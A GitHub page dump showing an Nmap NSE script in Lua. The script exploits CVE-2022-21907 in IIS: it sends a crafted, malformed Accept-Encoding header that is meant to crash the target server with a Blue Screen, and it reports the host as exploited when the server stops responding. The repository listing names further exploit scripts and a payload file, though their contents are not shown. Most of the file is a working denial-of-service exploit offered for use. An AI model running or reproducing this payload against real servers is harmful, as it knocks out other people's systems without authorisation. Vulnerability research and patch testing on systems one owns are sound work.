{"payload":{"allShortcutsEnabled":true,"fileTree":{"":{"items":[{"name":"CVE-2022-21907.ps1","path":"CVE-2022-21907.ps1","contentType":"file"},{"name":"CVE-2022-21907.rb","path":"CVE-2022-21907.rb","contentType":"file"},{"name":"CVE202221907.py","path":"CVE202221907.py","contentType":"file"},{"name":"LICENSE.txt","path":"LICENSE.txt","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"detection_protection_cve2022_21907.ps1","path":"detection_protection_cve2022_21907.ps1","contentType":"file"},{"name":"dos_iis_2022_21907.nse","path":"dos_iis_2022_21907.nse","contentType":"file"},{"name":"payload.txt","path":"payload.txt","contentType":"file"},{"name":"py_dos_iis_2022_21907.py","path":"py_dos_iis_2022_21907.py","contentType":"file"},{"name":"rb_dos_iis_2022_21907.md","path":"rb_dos_iis_2022_21907.md","contentType":"file"},{"name":"rb_dos_iis_2022_21907.rb","path":"rb_dos_iis_2022_21907.rb","contentType":"file"}],"totalCount":11}},"fileTreeProcessingTime":2.119459,"foldersToFetch":[],"reducedMotionEnabled":"system","repo":{"id":448387955,"defaultBranch":"main","name":"CVE-2022-21907","ownerLogin":"mauricelambert","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2022-01-16T03:50:25.000+07:00","ownerAvatar":"https://avatars.githubusercontent.com/u/50479118?v=4","public":true,"private":false,"isOrgOwned":false},"symbolsExpanded":false,"treeExpanded":true,"refInfo":{"name":"main","listCacheKey":"v0:1646679777.801373","canEdit":true,"refType":"branch","currentOid":"70349b8371c542423506b155daf3dedb06237653"},"path":"dos_iis_2022_21907.nse","currentUser":{"id":122620685,"login":"asepsaepdin","userEmail":"asepsaepdin8@gmail.com"},"blob":{"rawLines":["description = [[\r","  The IIS Web Server contains a RCE vulnerability. This script\r","  exploits this vulnerability with a DOS attack (causes a Blue Screen).\r","]]\r","\r","author = \"Maurice LAMBERT <mauricelambert434@gmail.com>\"\r","license = \"Same as Nmap--See https://nmap.org/book/man-legal.html\"\r","categories = {\"dos\", \"exploit\", \"intrusive\", \"vuln\"}\r","\r","---\r","-- @name\r","-- IIS DOS CVE-2022-21907 - Web Server Blue Screen\r","-- @author\r","-- Maurice LAMBERT <mauricelambert434@gmail.com>\r","-- @usage\r","-- nmap -p 80 --script dos_iis_2022_21907 <target>\r","-- @output\r","-- PORT   STATE SERVICE\r","-- 80/tcp open  http\r","-- | dos_iis_2022_21907:\r","-- |   VULNERABLE:\r","-- |   IIS CVE-2022-21907 DOS\r","-- |   State: VULNERABLE (Exploitable)\r","-- |   IDs:  CVE:CVE-2022-21907\r","-- |           The IIS Web Server contains a RCE vulnerability. This script\r","-- |           exploits this vulnerability with a DOS attack\r","-- |           (causes a Blue Screen).\r","-- |\r","-- |   Disclosure date: 2022-01-11\r","-- |   References:\r","-- |     https://nvd.nist.gov/vuln/detail/CVE-2022-21907\r","-- |     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21907\r","-- |_    https://github.com/mauricelambert/CVE-2022-21907\r","\r","local shortport = require \"shortport\"\r","local stdnse = require \"stdnse\"\r","local vulns = require \"vulns\"\r","local http = require \"http\"\r","\r","portrule = shortport.http\r","\r","action = function(host, port)\r","  local vuln = {\r","    title = \"IIS CVE-2022-21907 DOS\",\r","    state = vulns.STATE.NOT_VULN,\r","    IDS = { CVE = 'CVE-2022-21907' },\r","    description = [[\r","      The IIS Web Server contains a RCE vulnerability. This script\r","      exploits this vulnerability with a DOS attack\r","      (causes a Blue Screen).\r","    ]],\r","    references = {\r","       'https://nvd.nist.gov/vuln/detail/CVE-2022-21907',\r","       'https://github.com/mauricelambert/CVE-2022-21907',\r","     },\r","     dates = {\r","       disclosure = {year = '2022', month = '01', day = '11'},\r","     },\r","  }\r","\r","  local report = vulns.Report:new(SCRIPT_NAME, host, port)\r","  local headers = {}\r","  headers[\"Accept-Encoding\"] = \"AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAA\" ..\r","    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA\" ..\r","    \"**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ..\r","    \"AAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" ..\r","    \"AAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************A\" ..\r","    \"AAAAA, *, ,\"\r","\r","  stdnse.debug2(\"Web service is up. Send payload...\")\r","  local response = http.generic_request(\r","    host,\r","    port,\r","    \"GET\",\r","    \"/\",\r","    {\r","      timeout = 10,\r","      header = headers,\r","    }\r","  )\r","\r","  if (response.status) then\r","    return report:make_output(vuln)\r","  else\r","    vuln.state = vulns.STATE.EXPLOIT -- UNKNOWN, LIKELY_VULN\r","    return report:make_output(vuln)\r","  end\r","end"],"stylingDirectives":[[{"start":12,"end":13,"cssClass":"pl-k"},{"start":14,"end":16,"cssClass":"pl-s"},{"start":14,"end":16,"cssClass":"pl-pds"}],[{"start":0,"end":62,"cssClass":"pl-s"}],[{"start":0,"end":71,"cssClass":"pl-s"}],[{"start":0,"end":2,"cssClass":"pl-s"},{"start":0,"end":2,"cssClass":"pl-pds"}],[],[{"start":7,"end":8,"cssClass":"pl-k"},{"start":9,"end":56,"cssClass":"pl-s"},{"start":9,"end":10,"cssClass":"pl-pds"},{"start":55,"end":56,"cssClass":"pl-pds"}],[{"start":8,"end":9,"cssClass":"pl-k"},{"start":10,"end":66,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":65,"end":66,"cssClass":"pl-pds"}],[{"start":11,"end":12,"cssClass":"pl-k"},{"start":14,"end":19,"cssClass":"pl-s"},{"start":14,"end":15,"cssClass":"pl-pds"},{"start":18,"end":19,"cssClass":"pl-pds"},{"start":21,"end":30,"cssClass":"pl-s"},{"start":21,"end":22,"cssClass":"pl-pds"},{"start":29,"end":30,"cssClass":"pl-pds"},{"start":32,"end":43,"cssClass":"pl-s"},{"start":32,"end":33,"cssClass":"pl-pds"},{"start":42,"end":43,"cssClass":"pl-pds"},{"start":45,"end":51,"cssClass":"pl-s"},{"start":45,"end":46,"cssClass":"pl-pds"},{"start":50,"end":51,"cssClass":"pl-pds"}],[],[{"start":0,"end":3,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":8,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":50,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":10,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":48,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":9,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":50,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":10,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":23,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":20,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":24,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":18,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":29,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":38,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":31,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":75,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":60,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":38,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":4,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":34,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":18,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":56,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":70,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":57,"cssClass":"pl-c"},{"start":0,"end":2,"cssClass":"pl-c"}],[],[{"start":0,"end":5,"cssClass":"pl-k"},{"start":16,"end":17,"cssClass":"pl-k"},{"start":18,"end":25,"cssClass":"pl-c1"},{"start":26,"end":37,"cssClass":"pl-s"},{"start":26,"end":27,"cssClass":"pl-pds"},{"start":36,"end":37,"cssClass":"pl-pds"}],[{"start":0,"end":5,"cssClass":"pl-k"},{"start":13,"end":14,"cssClass":"pl-k"},{"start":15,"end":22,"cssClass":"pl-c1"},{"start":23,"end":31,"cssClass":"pl-s"},{"start":23,"end":24,"cssClass":"pl-pds"},{"start":30,"end":31,"cssClass":"pl-pds"}],[{"start":0,"end":5,"cssClass":"pl-k"},{"start":12,"end":13,"cssClass":"pl-k"},{"start":14,"end":21,"cssClass":"pl-c1"},{"start":22,"end":29,"cssClass":"pl-s"},{"start":22,"end":23,"cssClass":"pl-pds"},{"start":28,"end":29,"cssClass":"pl-pds"}],[{"start":0,"end":5,"cssClass":"pl-k"},{"start":11,"end":12,"cssClass":"pl-k"},{"start":13,"end":20,"cssClass":"pl-c1"},{"start":21,"end":27,"cssClass":"pl-s"},{"start":21,"end":22,"cssClass":"pl-pds"},{"start":26,"end":27,"cssClass":"pl-pds"}],[],[{"start":9,"end":10,"cssClass":"pl-k"},{"start":21,"end":25,"cssClass":"pl-smi"}],[],[{"start":7,"end":8,"cssClass":"pl-k"},{"start":9,"end":17,"cssClass":"pl-k"},{"start":18,"end":22,"cssClass":"pl-smi"},{"start":24,"end":28,"cssClass":"pl-smi"}],[{"start":2,"end":7,"cssClass":"pl-k"},{"start":13,"end":14,"cssClass":"pl-k"}],[{"start":10,"end":11,"cssClass":"pl-k"},{"start":12,"end":36,"cssClass":"pl-s"},{"start":12,"end":13,"cssClass":"pl-pds"},{"start":35,"end":36,"cssClass":"pl-pds"}],[{"start":10,"end":11,"cssClass":"pl-k"},{"start":18,"end":23,"cssClass":"pl-smi"},{"start":24,"end":32,"cssClass":"pl-smi"}],[{"start":8,"end":9,"cssClass":"pl-k"},{"start":16,"end":17,"cssClass":"pl-k"},{"start":18,"end":34,"cssClass":"pl-s"},{"start":18,"end":19,"cssClass":"pl-pds"},{"start":33,"end":34,"cssClass":"pl-pds"}],[{"start":16,"end":17,"cssClass":"pl-k"},{"start":18,"end":20,"cssClass":"pl-s"},{"start":18,"end":20,"cssClass":"pl-pds"}],[{"start":0,"end":66,"cssClass":"pl-s"}],[{"start":0,"end":51,"cssClass":"pl-s"}],[{"start":0,"end":29,"cssClass":"pl-s"}],[{"start":0,"end":6,"cssClass":"pl-s"},{"start":4,"end":6,"cssClass":"pl-pds"}],[{"start":15,"end":16,"cssClass":"pl-k"}],[{"start":7,"end":56,"cssClass":"pl-s"},{"start":7,"end":8,"cssClass":"pl-pds"},{"start":55,"end":56,"cssClass":"pl-pds"}],[{"start":7,"end":57,"cssClass":"pl-s"},{"start":7,"end":8,"cssClass":"pl-pds"},{"start":56,"end":57,"cssClass":"pl-pds"}],[],[{"start":11,"end":12,"cssClass":"pl-k"}],[{"start":18,"end":19,"cssClass":"pl-k"},{"start":26,"end":27,"cssClass":"pl-k"},{"start":28,"end":34,"cssClass":"pl-s"},{"start":28,"end":29,"cssClass":"pl-pds"},{"start":33,"end":34,"cssClass":"pl-pds"},{"start":42,"end":43,"cssClass":"pl-k"},{"start":44,"end":48,"cssClass":"pl-s"},{"start":44,"end":45,"cssClass":"pl-pds"},{"start":47,"end":48,"cssClass":"pl-pds"},{"start":54,"end":55,"cssClass":"pl-k"},{"start":56,"end":60,"cssClass":"pl-s"},{"start":56,"end":57,"cssClass":"pl-pds"},{"start":59,"end":60,"cssClass":"pl-pds"}],[],[],[],[{"start":2,"end":7,"cssClass":"pl-k"},{"start":15,"end":16,"cssClass":"pl-k"},{"start":23,"end":29,"cssClass":"pl-smi"},{"start":30,"end":33,"cssClass":"pl-c1"}],[{"start":2,"end":7,"cssClass":"pl-k"},{"start":16,"end":17,"cssClass":"pl-k"}],[{"start":10,"end":27,"cssClass":"pl-s"},{"start":10,"end":11,"cssClass":"pl-pds"},{"start":26,"end":27,"cssClass":"pl-pds"},{"start":29,"end":30,"cssClass":"pl-k"},{"start":31,"end":75,"cssClass":"pl-s"},{"start":31,"end":32,"cssClass":"pl-pds"},{"start":74,"end":75,"cssClass":"pl-pds"},{"start":76,"end":78,"cssClass":"pl-k"}],[{"start":4,"end":75,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":74,"end":75,"cssClass":"pl-pds"},{"start":76,"end":78,"cssClass":"pl-k"}],[{"start":4,"end":75,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":74,"end":75,"cssClass":"pl-pds"},{"start":76,"end":78,"cssClass":"pl-k"}],[{"start":4,"end":75,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":74,"end":75,"cssClass":"pl-pds"},{"start":76,"end":78,"cssClass":"pl-k"}],[{"start":4,"end":75,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":74,"end":75,"cssClass":"pl-pds"},{"start":76,"end":78,"cssClass":"pl-k"}],[{"start":4,"end":17,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":16,"end":17,"cssClass":"pl-pds"}],[],[{"start":9,"end":15,"cssClass":"pl-c1"},{"start":16,"end":52,"cssClass":"pl-s"},{"start":16,"end":17,"cssClass":"pl-pds"},{"start":51,"end":52,"cssClass":"pl-pds"}],[{"start":2,"end":7,"cssClass":"pl-k"},{"start":17,"end":18,"cssClass":"pl-k"},{"start":24,"end":39,"cssClass":"pl-c1"}],[],[],[{"start":4,"end":9,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":8,"end":9,"cssClass":"pl-pds"}],[{"start":4,"end":7,"cssClass":"pl-s"},{"start":4,"end":5,"cssClass":"pl-pds"},{"start":6,"end":7,"cssClass":"pl-pds"}],[],[{"start":14,"end":15,"cssClass":"pl-k"},{"start":16,"end":18,"cssClass":"pl-c1"}],[{"start":13,"end":14,"cssClass":"pl-k"}],[],[],[],[{"start":2,"end":4,"cssClass":"pl-k"},{"start":15,"end":21,"cssClass":"pl-smi"},{"start":23,"end":27,"cssClass":"pl-k"}],[{"start":4,"end":10,"cssClass":"pl-k"},{"start":18,"end":29,"cssClass":"pl-c1"}],[{"start":2,"end":6,"cssClass":"pl-k"}],[{"start":9,"end":14,"cssClass":"pl-smi"},{"start":15,"end":16,"cssClass":"pl-k"},{"start":23,"end":28,"cssClass":"pl-smi"},{"start":29,"end":36,"cssClass":"pl-smi"},{"start":37,"end":60,"cssClass":"pl-c"},{"start":37,"end":39,"cssClass":"pl-c"}],[{"start":4,"end":10,"cssClass":"pl-k"},{"start":18,"end":29,"cssClass":"pl-c1"}],[{"start":2,"end":5,"cssClass":"pl-k"}],[{"start":0,"end":3,"cssClass":"pl-k"}]],"csv":null,"csvError":null,"dependabotInfo":{"showConfigurationBanner":false,"configFilePath":null,"networkDependabotPath":"/mauricelambert/CVE-2022-21907/network/updates","dismissConfigurationNoticePath":"/settings/dismiss-notice/dependabot_configuration_notice","configurationNoticeDismissed":false,"repoAlertsPath":"/mauricelambert/CVE-2022-21907/security/dependabot","repoSecurityAndAnalysisPath":"/mauricelambert/CVE-2022-21907/settings/security_analysis","repoOwnerIsOrg":false,"currentUserCanAdminRepo":false},"displayName":"dos_iis_2022_21907.nse","displayUrl":"https://github.com/mauricelambert/CVE-2022-21907/blob/main/dos_iis_2022_21907.nse?raw=true","headerInfo":{"blobSize":"2.76 KB","deleteInfo":{"deleteTooltip":"Fork this repository and delete the file"},"editInfo":{"editTooltip":"Fork this repository and edit the file"},"ghDesktopPath":"https://desktop.github.com","gitLfsPath":null,"onBranch":true,"shortPath":"8e6e705","siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Fmauricelambert%2FCVE-2022-21907%2Fblob%2Fmain%2Fdos_iis_2022_21907.nse","isCSV":false,"isRichtext":false,"toc":null,"lineInfo":{"truncatedLoc":"88","truncatedSloc":"80"},"mode":"file"},"image":false,"isCodeownersFile":null,"isPlain":false,"isValidLegacyIssueTemplate":false,"issueTemplateHelpUrl":"https://docs.github.com/articles/about-issue-and-pull-request-templates","issueTemplate":null,"discussionTemplate":null,"language":"Lua","languageID":213,"large":false,"loggedIn":true,"newDiscussionPath":"/mauricelambert/CVE-2022-21907/discussions/new","newIssuePath":"/mauricelambert/CVE-2022-21907/issues/new","planSupportInfo":{"repoIsFork":null,"repoOwnedByCurrentUser":null,"requestFullPath":"/mauricelambert/CVE-2022-21907/blob/main/dos_iis_2022_21907.nse","showFreeOrgGatedFeatureMessage":null,"showPlanSupportBanner":null,"upgradeDataAttributes":null,"upgradePath":null},"publishBannersInfo":{"dismissActionNoticePath":"/settings/dismiss-notice/publish_action_from_dockerfile","dismissStackNoticePath":"/settings/dismiss-notice/publish_stack_from_file","releasePath":"/mauricelambert/CVE-2022-21907/releases/new?marketplace=true","showPublishActionBanner":false,"showPublishStackBanner":false},"renderImageOrRaw":false,"richText":null,"renderedFileInfo":null,"shortPath":null,"tabSize":8,"topBannersInfo":{"overridingGlobalFundingFile":false,"globalPreferredFundingPath":null,"repoOwner":"mauricelambert","repoName":"CVE-2022-21907","showInvalidCitationWarning":false,"citationHelpUrl":"https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","showDependabotConfigurationBanner":false,"actionsOnboardingTip":null},"truncated":false,"viewable":true,"workflowRedirectUrl":null,"symbols":{"timedOut":false,"notAnalyzed":true,"symbols":[]}},"copilotInfo":{"notices":{"codeViewPopover":{"dismissed":false,"dismissPath":"/settings/dismiss-notice/code_view_copilot_popover"}},"userAccess":{"accessAllowed":false,"hasSubscriptionEnded":false,"orgHasCFBAccess":false,"userHasCFIAccess":false,"userHasOrgs":false,"userIsOrgAdmin":false,"userIsOrgMember":false,"business":null,"featureRequestInfo":null}},"csrf_tokens":{"/mauricelambert/CVE-2022-21907/branches":{"post":"C250wlOkKAjDh7qXeaHEnHVGWh3KdjJUeD_l6R6z-VYjLTbI3EfbkcLqLFfhaLp6TixNU0vg58h7WQIzi4zdLA"},"/repos/preferences":{"post":"L2FBZ1w4zD6Nmp0pZnv_CBHm0OjFLEIrGYNCo_wEtyBgC5OWTsaKwg0E2pAIHQjndmgEeile8iBSFcDOVwTwgQ"}}},"title":"CVE-2022-21907/dos_iis_2022_21907.nse at main Â· mauricelambert/CVE-2022-21907"}